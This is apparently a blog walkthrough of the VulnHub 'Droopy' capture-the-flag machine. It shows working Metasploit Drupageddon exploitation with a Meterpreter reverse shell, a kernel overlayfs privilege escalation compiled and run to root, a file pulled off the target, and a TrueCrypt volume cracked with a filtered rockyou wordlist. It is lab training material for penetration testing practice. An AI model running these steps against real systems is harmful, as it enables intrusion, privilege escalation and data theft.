---
layout: post
title: "Dropping Droopy"
date: 2018-05-04 13:05:08 -0400
comments: true
categories: [penetration testing, writeups]
keywords: droopy, droopy 0.2, droopy vulnhub, vulnhub, pentest lab, hacking lab, ctf, drupal exploit, drupageddon, truecrack, truecrypt cracking
description: Droopy writeup
---

I'm back in the game with preparing for OSCP, and resuming the VulnHub machines. Today's target is Droopy. The author left 2 hints for this challenge:

1.) Grab a copy of the rockyou wordlist.

2.) It's fun to read other people's email.

<!-- more -->

``` 
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Welcome to La fraude fiscale des grandes soci\xC3\xA9t\xC3\xA9s | La fraud...
```

Looks like this will be a web-based challenge. 

{% img center /images/pentest/droopy.png 'droopy' 'droopy' %}

There are quite a few entries inside robots.txt:

``` 
User-agent: *
Crawl-delay: 10
# Directories
Disallow: /includes/
Disallow: /misc/
Disallow: /modules/
Disallow: /profiles/
Disallow: /scripts/
Disallow: /themes/
# Files
Disallow: /CHANGELOG.txt
Disallow: /cron.php
Disallow: /INSTALL.mysql.txt
Disallow: /INSTALL.pgsql.txt
Disallow: /INSTALL.sqlite.txt
Disallow: /install.php
Disallow: /INSTALL.txt
Disallow: /LICENSE.txt
Disallow: /MAINTAINERS.txt
Disallow: /update.php
Disallow: /UPGRADE.txt
Disallow: /xmlrpc.php
# Paths (clean URLs)
Disallow: /admin/
Disallow: /comment/reply/
Disallow: /filter/tips/
Disallow: /node/add/
Disallow: /search/
Disallow: /user/register/
Disallow: /user/password/
Disallow: /user/login/
Disallow: /user/logout/
# Paths (no clean URLs)
Disallow: /?q=admin/
Disallow: /?q=comment/reply/
Disallow: /?q=filter/tips/
Disallow: /?q=node/add/
Disallow: /?q=search/
Disallow: /?q=user/password/
Disallow: /?q=user/register/
Disallow: /?q=user/login/
Disallow: /?q=user/logout/
```

Sifting through the entries, I found the exact version on Drupal is 7.30, from the /CHANGELOG.txt file. Googling an exploit for this version led me to..[Drupageddon](https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon)!!  Or more official, CVE-2014-3704, which describes a SQL injection vulnerability in Drupal. I fired up Metasploit for the exploit:

``` 
msf > use exploit/multi/http/drupal_drupageddon
msf exploit(drupal_drupageddon) > info

       Name: Drupal HTTP Parameter Key/Value SQL Injection
     Module: exploit/multi/http/drupal_drupageddon
   Platform: PHP
       Arch: php
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2014-10-15

Provided by:
  SektionEins
  Christian Mehlmauer <FireFart@gmail.com>
  Brandon Perry

Available targets:
  Id  Name
  --  ----
  0   Drupal 7.0 - 7.31

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOST      192.168.217.139  yes       The target address
  RPORT      80               yes       The target port (TCP)
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
  TARGETURI  /                yes       The target URI of the Drupal installation
  VHOST                       no        HTTP server virtual host

Payload information:

Description:
  This module exploits the Drupal HTTP Parameter Key/Value SQL 
  Injection (aka Drupageddon) in order to achieve a remote shell on 
  the vulnerable instance. This module was tested against Drupal 7.0 
  and 7.31 (was fixed in 7.32).

References:
  https://cvedetails.com/cve/CVE-2014-3704/
  https://www.drupal.org/SA-CORE-2014-005
  http://www.sektioneins.de/en/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html
msf exploit(drupal_drupageddon) > exploit

[*] Started reverse TCP handler on 192.168.217.132:4444 
[*] Testing page
[*] Creating new user yCTZcwgtLV:WLhkIYdDtB
[*] Logging in as yCTZcwgtLV:WLhkIYdDtB
[*] Trying to parse enabled modules
[*] Enabling the PHP filter module
[*] Setting permissions for PHP filter module
[*] Getting tokens from create new article page
[*] Calling preview page. Exploit should trigger...
[*] Sending stage (37543 bytes) to 192.168.217.139
[*] Meterpreter session 1 opened (192.168.217.132:4444 -> 192.168.217.139:51854) at 2018-05-04 13:48:44 -0400
```

I dropped into a shell and checked the kernel version:

``` 
meterpreter > shell
Process 1385 created.
Channel 0 created.
uname -a
Linux droopy 3.13.0-43-generic #72-Ubuntu SMP Mon Dec 8 19:35:06 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
```

I ran the 3.13 version through the exploit check part of my [privcheck](https://github.com/chousensha/linux_privcheck) script:

``` 
python linux_privcheck.py 
Kernel version is 3.13
###########################################
POTENTIALLY VULNERABLE TO
Name: Double-free usb-midi SMEP Local Privilege Escalation
CVE: CVE-2016-2384
Source code: https://www.exploit-db.com/exploits/41999/
###########################################
###########################################
POTENTIALLY VULNERABLE TO
Name: overlayfs Privilege Escalation
CVE: CVE-2015-1328
Source code: https://www.exploit-db.com/exploits/37292/
###########################################
###########################################
POTENTIALLY VULNERABLE TO
Name: ptrace/sysret Privilege Escalation
CVE: CVE-2014-4699
Source code: https://www.exploit-db.com/exploits/34134/
###########################################
###########################################
POTENTIALLY VULNERABLE TO
Name: CLONE_NEWUSER|CLONE_FS Privilege Escalation
CVE: N/A
Source code: https://www.exploit-db.com/exploits/38390/
###########################################
###########################################
POTENTIALLY VULNERABLE TO
Name: b43 Wireless Driver Privilege Escalation
CVE: CVE-2013-2852
Source code: https://www.exploit-db.com/exploits/38559/
###########################################
###########################################
POTENTIALLY VULNERABLE TO
Name: open-time Capability file_ns_capable() Privilege Escalation
CVE: CVE-2013-1959
Source code: https://www.exploit-db.com/exploits/25450/
###########################################
```

Ubuntu and overlayfs exploit = PWN! I uploaded the exploit source code to the target via Meterpreter:

``` 
meterpreter > upload /root/37292.c /tmp/
[*] uploading  : /root/37292.c -> /tmp/
[*] uploaded   : /root/37292.c -> /tmp//37292.c
```

I went back to the shell, and compiled the exploit and made it executable. Droopy is rooted!

``` 
gcc 37292.c -o overlayfs
chmod +x overlayfs
./overlayfs
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
sh: 0: can't access tty; job control turned off
# whoami
root
```

But the challenge is not over here. We are root, but remember the hints! We didn't get to do anything with them. I went to the <code>/var/mail</code> directory and found the following message:

``` 
# cat www-data
From Dave <dave@droopy.example.com> Wed Thu 14 Apr 04:34:39 2016
Date: 14 Apr 2016 04:34:39 +0100
From: Dave <dave@droopy.example.com>
Subject: rockyou with a nice hat!
Message-ID: <730262568@example.com>
X-IMAP: 0080081351 0000002016
Status: NN

George,

   I've updated the encrypted file... You didn't leave any
hints for me. The password isn't longer than 11 characters
and anyway, we know what academy we went to, don't you...?

I'm sure you'll figure it out it won't rockyou too much!

If you are still struggling, remember that song by The Jam

Later,
Dave
```

Here it is, another reference to the rockyou list! I've looked around and found the mentioned encrypted file at <code>/root/dave.tc</code>. The *tc* extension is for a Truecrypt virtual encrypted disk. So now we know what to crack, and roughly how to do it.

The rockyou.txt file has over 14 million entries, so we're gonna need to make good use of the hints:

``` 
wc -l /usr/share/wordlists/rockyou.txt 
14344392 /usr/share/wordlists/rockyou.txt
``` 

I made a new file with only the entries that were 11 characters long:

``` 
grep -E '^.{11}$' /usr/share/wordlists/rockyou.txt > /root/rocked.txt
wc -l rocked.txt 
865891 rocked.txt
```

And then I created a final file with only the entries that had "academy" in them:

``` 
grep academy rocked.txt > rockademy.txt
wc -l rockademy.txt 
16 rockademy.txt
```

From over 14 million to 16 entries?! Sounds too good to be true! Let's put it to the test. First, I had to transfer the encrypted file to my machine. I copied *dave.tc* to /tmp and then downloaded it from there with meterpreter:

``` 
meterpreter > download /tmp/dave.tc
[*] Downloading: /tmp/dave.tc -> dave.tc
[*] Downloaded 1.00 MiB of 5.00 MiB (20.0%): /tmp/dave.tc -> dave.tc
[*] Downloaded 2.00 MiB of 5.00 MiB (40.0%): /tmp/dave.tc -> dave.tc
[*] Downloaded 3.00 MiB of 5.00 MiB (60.0%): /tmp/dave.tc -> dave.tc
[*] Downloaded 4.00 MiB of 5.00 MiB (80.0%): /tmp/dave.tc -> dave.tc
[*] Downloaded 5.00 MiB of 5.00 MiB (100.0%): /tmp/dave.tc -> dave.tc
[*] download   : /tmp/dave.tc -> dave.tc
```

For cracking the file, Kali already comes with TrueCrack preinstalled:

> TrueCrack is a brute-force password cracker for TrueCrypt volumes. It works on Linux 
> and it is optimized for Nvidia Cuda technology. It supports:

>    PBKDF2 (defined in PKCS5 v2.0) based on key derivation functions: Ripemd160, Sha512
> and Whirlpool.
>    XTS block cipher mode for hard disk encryption based on encryption algorithms: AES,
> SERPENT, TWOFISH.
>    File-hosted (container) and Partition/device-hosted.
>    Hidden volumes and Backup headers.

> TrueCrack is able to perform a brute-force attack based on:

>    Dictionary: read the passwords from a file of words.
>    Alphabet: generate all passwords of given length from given alphabet.

> TrueCrack works on gpu and cpu

``` 
truecrack
TrueCrack v3.0
Website: http://code.google.com/p/truecrack
Contact us: infotruecrack@gmail.com
Bruteforce password cracker for Truecrypt volume. Optimazed with Nvidia Cuda technology.
Based on TrueCrypt, freely available at http://www.truecrypt.org/
Copyright (c) 2011 by Luca Vaccaro.

Usage:
 truecrack -t <truecrypt_file> -k <ripemd160|sha512|whirlpool> -w <wordlist_file> [-b <parallel_block>]
 truecrack -t <truecrypt_file> -k <ripemd160|sha512|whirlpool> -c <charset> [-s <minlength>] -m <maxlength> [-b <parallel_block>]

Options:
 -h --help            			Display this information.
 -t --truecrypt <truecrypt_file>  	Truecrypt volume file.
 -k --key <ripemd160 | sha512 | whirlpool>  	Key derivation function (default ripemd160).
 -b --blocksize <parallel_blocks>   	Number of parallel computations (board dependent).
 -w --wordlist <wordlist_file>  	File of words, for Dictionary attack.
 -c --charset <alphabet>		Alphabet generator, for Alphabet attack.
 -s --startlength <minlength>		Starting length of passwords, for Alphabet attack (default 1).
 -m --maxlength <maxlength>		Maximum length of passwords, for Alphabet attack.
 -r --restore <number>			Restore the computation.
 -v --verbose         			Show computation messages.

Sample:
 Dictionary mode: truecrack --truecrypt ./volume --wordlist ./dictionary.txt 
 Charset mode: truecrack --truecrypt ./volume --charset ./dictionary.txt --maxlength 10
```

The moment of truth! It didn't work the first try, but then I specified the key function as SHA512:

``` 
truecrack --truecrypt dave.tc -k sha512 --wordlist rockademy.txt 
TrueCrack v3.0
Website: http://code.google.com/p/truecrack
Contact us: infotruecrack@gmail.com
Found password:		"etonacademy"
Password length:	"12"
Total computations:	"10"
```

It worked! Now all that remains is to open the volume and snoop around:

``` 
cryptsetup open --type tcrypt dave.tc hidden
Enter passphrase: 
mkdir -p /mnt/tcrypt
mount /dev/mapper/hidden /mnt/tcrypt/
root@kali:/mnt/tcrypt# ls -la
total 20
drwxr-xr-x 6 root root  1024 Apr 12  2016 .
drwxr-xr-x 6 root root  4096 May  4 16:20 ..
drwxr-xr-x 2 root root  1024 Apr 12  2016 buller
drwx------ 2 root root 12288 Apr 12  2016 lost+found
drwxr-xr-x 2 root root  1024 Apr 12  2016 panama
drwxr-xr-x 3 root root  1024 Apr 12  2016 .secret
```

A hidden directory..with another hidden directory inside it:

``` 
root@kali:/mnt/tcrypt/.secret# ls -la
total 64
drwxr-xr-x 3 root root  1024 Apr 12  2016 .
drwxr-xr-x 6 root root  1024 Apr 12  2016 ..
-rw-r--r-- 1 root root 61118 Feb 25  2016 piers.png
drwxr-xr-x 2 root root  1024 Apr 12  2016 .top
```

And finally, the flag!

``` 
root@kali:/mnt/tcrypt/.secret/.top# cat flag.txt 

################################################################################
#   ___ ___  _  _  ___ ___    _ _____ _   _ _      _ _____ ___ ___  _  _  ___  #
#  / __/ _ \| \| |/ __| _ \  /_\_   _| | | | |    /_\_   _|_ _/ _ \| \| |/ __| #
# | (_| (_) | .` | (_ |   / / _ \| | | |_| | |__ / _ \| |  | | (_) | .` |\__ \ #
#  \___\___/|_|\_|\___|_|_\/_/ \_\_|  \___/|____/_/ \_\_| |___\___/|_|\_||___/ #
#                                                                              #
################################################################################

Firstly, thanks for trying this VM. If you have rooted it, well done!

Shout-outs go to #vulnhub for hosting a great learning tool. A special thanks
goes to barrebas and junken for help in testing and final configuration.
                                                                    --knightmare
```

Nice challenge that involved adjusting a wordlist and TrueCrypt cracking! It rocked!

``` 
 ________________________________________
/ You will be awarded a medal for        \
\ disregarding safety in saving someone. /
 ----------------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```







